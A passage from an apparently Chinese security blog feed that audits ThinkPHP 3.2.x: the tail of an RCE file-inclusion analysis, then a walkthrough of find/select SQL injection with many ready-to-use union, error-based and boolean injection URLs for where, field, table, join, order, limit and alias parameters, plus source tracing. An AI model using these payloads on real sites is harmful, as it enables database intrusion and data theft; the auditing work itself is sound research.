single-quoted-string">'think'</span><span class="token operator">==</span><span class="token variable">$engine</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">// 采用Think模板引擎</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">checkContentCache</span><span class="token punctuation">(</span><span class="token variable">$_data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'prefix'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>              <span class="token operator">||</span>  <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">checkCache</span><span class="token punctuation">(</span><span class="token variable">$_data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'prefix'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 缓存有效</span>             <span class="token comment">//载入模版缓存文件</span>             <span class="token class-name static-context">Storage</span><span class="token operator">::</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'CACHE_PATH'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$_data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'prefix'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_content</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'TMPL_CACHFILE_SUFFIX'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$_data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>             <span class="token variable">$tpl</span> <span class="token operator">=</span> <span class="token class-name static-context">Think</span><span class="token operator">::</span><span class="token function">instance</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Think\\Template'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">// 编译并加载模板文件</span>             <span class="token variable">$tpl</span><span class="token operator">-&gt;</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token variable">$_content</span><span class="token punctuation">,</span><span class="token variable">$_data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'prefix'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>     <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>         <span class="token comment">// 调用第三方模板引擎解析和输出</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$engine</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>             <span class="token variable">$class</span>  <span class="token operator">=</span>   <span class="token variable">$engine</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>             <span class="token variable">$class</span>   <span class="token operator">=</span>  <span class="token string single-quoted-string">'Think\\Template\\Driver\\'</span><span class="token operator">.</span><span class="token function">ucwords</span><span class="token punctuation">(</span><span class="token variable">$engine</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                         <span class="token punctuation">}</span>                     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">class_exists</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token variable">$tpl</span>   <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token variable">$class</span><span class="token punctuation">;</span>             <span class="token variable">$tpl</span><span class="token operator">-&gt;</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token variable">$_content</span><span class="token punctuation">,</span><span class="token variable">$_data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>  <span class="token comment">// 类没有定义</span>             <span class="token function">E</span><span class="token punctuation">(</span><span class="token function">L</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'_NOT_SUPPORT_'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">': '</span> <span class="token operator">.</span> <span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进入<code>ThinkPHP/Library/Think/Template.class.php</code>的fetch函数</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token punctuation">,</span><span class="token variable">$templateVar</span><span class="token punctuation">,</span><span class="token variable">$prefix</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">tVar</span>         <span class="token operator">=</span>   <span class="token variable">$templateVar</span><span class="token punctuation">;</span>    <span class="token variable">$templateCacheFile</span>  <span class="token operator">=</span>   <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">loadTemplate</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token punctuation">,</span><span class="token variable">$prefix</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name static-context">Storage</span><span class="token operator">::</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token variable">$templateCacheFile</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">tVar</span><span class="token punctuation">,</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'tpl'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进入最后的load函数，$var不为空则使用extract方法的EXTR_OVERWRITE默认描述对变量值进行覆盖，</p><p>之后include该日志文件路径，造成文件包含。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">load</span><span class="token punctuation">(</span><span class="token variable">$_filename</span><span class="token punctuation">,</span><span class="token variable">$vars</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$vars</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$vars</span><span class="token punctuation">,</span> <span class="token constant">EXTR_OVERWRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">include</span> <span class="token variable">$_filename</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ">【漏洞通报】ThinkPHP3.2.x RCE漏洞通报</a></p><p><a href="https://0xcreed.jxustctf.top/2021/07/ThinkPHP3-2-x-RCE%E5%A4%8D%E7%8E%B0/">ThinkPHP3.2.x RCE复现</a></p><p><a href="https://www.cnblogs.com/sevck/p/15012267.html">炒冷饭之ThinkPHP3.2.X RCE漏洞分析</a></p>]]></content>
      
      
      <categories>
          
          <category> PHP代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> php </tag>
            
            <tag> ThinkPHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计—ThinkPHP3.2.X_find_select_delete注入(2018-08-23)</title>
      <link href="posts/32769.html"/>
      <url>posts/32769.html</url>
      
        <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><a href="https://www.thinkphp.cn/donate/download/id/610.html">下载：ThinkPHP3.2.3完整版 - ThinkPHP框架</a></p><h2 id="数据库配置"><a href="#数据库配置" class="headerlink" title="数据库配置"></a>数据库配置</h2><p>创建数据库thinkphp,表为user,含有三个字段id,username,pass</p><p>修改Application\Common\Conf\config.php配置文件，添加数据库配置信息</p><pre class="line-numbers language-none"><code class="language-none"> &lt;?phpreturn array('DB_TYPE'               =&gt;  'mysql',     // 数据库类型    'DB_HOST'               =&gt;  '127.0.0.1', // 服务器地址    'DB_NAME'               =&gt;  'thinkphp',          // 数据库名    'DB_USER'               =&gt;  'root',      // 用户名    'DB_PWD'                =&gt;  'root',          // 密码    'DB_PORT'               =&gt;  '3306',        // 端口    'DB_PREFIX'             =&gt;  '',    // 数据库表前缀    'DB_PARAMS'             =&gt;  array(), // 数据库连接参数    'DB_DEBUG'              =&gt;  TRUE, // 数据库调试模式 开启后可以记录SQL日志    'DB_FIELDS_CACHE'       =&gt;  true,        // 启用字段缓存    'DB_CHARSET'            =&gt;  'utf8',      // 数据库编码默认采用utf8    'DB_DEPLOY_TYPE'        =&gt;  0, // 数据库部署方式:0 集中式(单一服务器),1 分布式(主从服务器)    'DB_RW_SEPARATE'        =&gt;  false,       // 数据库读写是否分离 主从式有效    'DB_MASTER_NUM'         =&gt;  1, // 读写分离后 主服务器数量    'DB_SLAVE_NO'           =&gt;  '', // 指定从服务器序号);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="数据库测试"><a href="#数据库测试" class="headerlink" title="数据库测试"></a>数据库测试</h2><p>在<strong>thinkphp32\Application\Home\Controller\IndexController.class.php</strong> 创建函数，内容如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'users'</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">where</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'id=1'</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>浏览器访问测试：  </p><p><a href="http://127.0.0.1/index.php/Home/Index/test">http://127.0.0.1/index.php/Home/Index/test</a></p><p><a href="http://127.0.0.1/index.php?m=Home&amp;c=index&amp;a=test">http://127.0.0.1/index.php?m=Home&amp;c=index&amp;a=test</a></p><p><a href="http://127.0.0.1/index.php?s=home/index/test">http://127.0.0.1/index.php?s=/Home/index/test</a></p><h1 id="select-find"><a href="#select-find" class="headerlink" title="select/find"></a>select/find</h1><p>在<strong>thinkphp32\Application\Home\Controller\IndexController.class.php</strong> 创建函数，内容如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;style type="text/css"&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: "微软雅黑"; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}&lt;/style&gt;&lt;div style="padding: 24px 48px;"&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V{$Think.version}&lt;/div&gt;&lt;script type="text/javascript" src="http://ad.topthink.com/Public/static/client.js"&gt;&lt;/script&gt;&lt;thinkad id="ad_55e75dfae343f5a1"&gt;&lt;/thinkad&gt;&lt;script type="text/javascript" src="http://tajs.qq.com/stats?sId=9347272" charset="UTF-8"&gt;&lt;/script&gt;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'users'</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>where</p><pre class="line-numbers language-none"><code class="language-none">#第一种payload#联合查询http://127.0.0.1/index.php?s=/Home/index/test&amp;id[where]=1=1 union select 1,2,user() %23#报错http://127.0.0.1/index.php?s=/Home/index/test&amp;id[where]=extractvalue(0x7e,concat(0x7e,user())) %23#逻辑判断http://127.0.0.1/index.php?s=/Home/index/test&amp;id[where]=1=1 %23#第二种payload#联合查询http://127.0.0.1/index.php?s=/Home/index/test&amp;id[where][_string]=1=1) union select 1,2,user() %23#报错http://127.0.0.1/index.php?s=/Home/index/test&amp;id[where][_string]=extractvalue(0x7e,concat(0x7e,user()))) %23#逻辑判断http://127.0.0.1/index.php?s=/Home/index/test&amp;id[where][_string]=1=1) %23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> field</p><pre class="line-numbers language-none"><code class="language-none">#注:请保证以,为分割payload,保证分割得到的每一部分均含有至少一个空格(或其他parseKey中匹配的字符),否则该部分会被一对`包裹;并且需要知道目标数据库中至少1个数据表#联合查询http://127.0.0.1/index.php?s=/Home/index/test&amp;id[field]=1 from users union select user()%23#报错http://127.0.0.1/index.php?s=/Home/index/test&amp;id[field]=1 , extractvalue(0x7e, concat(0x7e, user())) from users %23#逻辑判断http://127.0.0.1/index.php?s=/Home/index/test&amp;id[field]=* from users where 1=1 %23　<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>table</p><pre class="line-numbers language-none"><code class="language-none"># 注:请保证以,为分割payload,保证分割得到的每一部分均含有至少一个空格(或其他parseKey中匹配的字符),否则该部分会被一对`包裹;# 并且需要知道目标数据库中至少1个数据表#联合查询http://127.0.0.1/index.php?s=/Home/index/test&amp;id[table]=users union select 1,2,user() %23#报错http://127.0.0.1/index.php?s=/Home/index/test&amp;?id[table]=users where extractvalue(0x7e, concat(0x7e, user())) %23#逻辑判断http://127.0.0.1/index.php?s=/Home/index/test&amp;id[table]=users where 1=1 %23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>join</p><pre class="line-numbers language-none"><code class="language-none">#联合查询http://127.0.0.1/index.php?s=/Home/index/test&amp;id[join][]=union select 1,2 %23#报错http://127.0.0.1/index.php?s=/Home/index/test&amp;id[join][]=where extractvalue(0x7e,concat(0x7e,user())) %23#逻辑判断http://127.0.0.1/index.php?s=/Home/index/test&amp;id[join][]=where 1=1 %23　<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>force</p><pre class="line-numbers language-none"><code class="language-none">#注:审计环境设置的索引为字段id,使用payload时请修改为对应的索引,在未知索引或不存在索引的情况下无法使用#联合查询http://127.0.0.1/index.php?s=/Home/index/test&amp;id[force]=id) union select 1,2,user() %23#报错http://127.0.0.1/index.php?s=/Home/index/test&amp;id[force]=id) where extractvalue(0x7e,concat(0x7e,version())) %23#逻辑判断http://127.0.0.1/index.php?s=/Home/index/test&amp;id[force]=id) where 1=1 %23　<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>group</p><pre class="line-numbers language-none"><code class="language-none">#注:需要已知所查数据表中任意一字段名#联合查询http://127.0.0.1/index.php?s=/Home/index/test&amp;id[group]=id union select 1,2,user() %23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>having</p><pre class="line-numbers language-none"><code class="language-none">#注:需要已知所查数据表中任意一字段名#联合查询http://127.0.0.1/index.php?s=/Home/index/test&amp;id[having]=id union select 1,2,user() %23#逻辑判断http://127.0.0.1/index.php?s=/Home/index/test&amp;id[having]=1=1 %23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>order</p><pre class="line-numbers language-none"><code class="language-none">#报错http://127.0.0.1/index.php?s=/Home/index/test&amp;id[order]=extractvalue(0x7e,concat(0x7e,version())) %23#逻辑判断http://127.0.0.1/index.php?s=/Home/index/test&amp;id[order]=1=1 %23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>limit</p><pre class="line-numbers language-none"><code class="language-none">#限于5.0.0&lt; MySQL &lt;5.6.6版本才能使用#报错http://127.0.0.1/index.php?s=/Home/index/test&amp;id[page][]=1&amp;id[page][]=1 procedure analyse(extractvalue(0x7e,concat(0x7e, version())),number) %23　<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>alias</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[alias]=where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先用 <code>I</code> 方法获取id的值，跟进<code>I</code>方法，过滤方式 filter 默认为 DEFAULT_FILTER ，对应值为htmlspecialchars。</p><pre class="line-numbers language-none"><code class="language-none">$filters    =   isset($filter)?$filter:C('DEFAULT_FILTER');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后判断传入的参数是不是数组，使用filter对应的方法处理一边，但是因为默认为htmlspecialchars，对其值进行实体编码，所以并没什么影响</p><pre class="line-numbers language-none"><code class="language-none">$data   =   is_array($data) ? array_map_recursive($filter,$data) : $filter($data); // 参数过滤<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后在380行进行了强制类型转换,默认为字符型，所以也没影响</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">case</span> <span class="token string single-quoted-string">'a'</span><span class="token punctuation">:</span><span class="token comment">// 数组</span><span class="token variable">$data</span> <span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword type-casting">array</span><span class="token punctuation">)</span><span class="token variable">$data</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token string single-quoted-string">'d'</span><span class="token punctuation">:</span><span class="token comment">// 数字</span><span class="token variable">$data</span> <span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$data</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token string single-quoted-string">'f'</span><span class="token punctuation">:</span><span class="token comment">// 浮点</span><span class="token variable">$data</span> <span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword type-casting">float</span><span class="token punctuation">)</span><span class="token variable">$data</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token string single-quoted-string">'b'</span><span class="token punctuation">:</span><span class="token comment">// 布尔</span><span class="token variable">$data</span> <span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword type-casting">boolean</span><span class="token punctuation">)</span><span class="token variable">$data</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string single-quoted-string">'s'</span><span class="token punctuation">:</span>   <span class="token comment">// 字符串</span>        <span class="token keyword">default</span><span class="token punctuation">:</span>            <span class="token variable">$data</span>   <span class="token operator">=</span>   <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$data</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后在402行,如果传值为数组时，会进行正则过滤</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">array_walk_recursive</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'think_filter'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是这里的过滤关键字并不针对SQL注入漏洞，可以轻易饶过</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$value</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">' '</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后再看select函数的内部实现</p><p>当<code>$options</code>为数字或者字符串类型的时候，直接指定当前查询表的主键作为查询字段</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// 根据主键查询</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">,</span><span class="token string single-quoted-string">','</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$where</span><span class="token punctuation">[</span><span class="token variable">$pk</span><span class="token punctuation">]</span>     <span class="token operator">=</span>  <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'IN'</span><span class="token punctuation">,</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$where</span><span class="token punctuation">[</span><span class="token variable">$pk</span><span class="token punctuation">]</span>     <span class="token operator">=</span>  <span class="token variable">$options</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$options</span>            <span class="token operator">=</span>  <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span>   <span class="token operator">=</span>  <span class="token variable">$where</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>满足<code>$options</code> 和 <code>$pk</code>主键同时为数组时，进入根据复合主键查询，但这个对于表只设置一个主键的时候不成立。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$pk</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果 <code>$options</code>  为 false , 用于子查询 不查询只返回SQL</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">===</span> <span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">// 用于子查询 不查询只返回SQL</span>        <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fetch_sql'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>那么就可以使<code>$options</code>为数组，同时找到一个表只有一个主键，就可以绕过三次判断，直接进入<code>_parseOptions</code>进行解析。</p><p>然后看表达式分析  <code>_parseOptions</code> 方法</p><p><code>$options</code>我们可控，那么就可以控制为数组类型，传入<code>$options['table']</code>或<code>$options['alias']</code>等等，都没有进行过滤</p><p>传入<code>$options['where']</code> 时，设置<code>$options['where']</code>的值为字符串，即可绕过字段类型的验证。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">_parseOptions</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">////当$options为数组的时候 直接与 $this-&gt;options 数组进行 合并</span>        <span class="token variable">$options</span> <span class="token operator">=</span>  <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">options</span><span class="token punctuation">,</span><span class="token 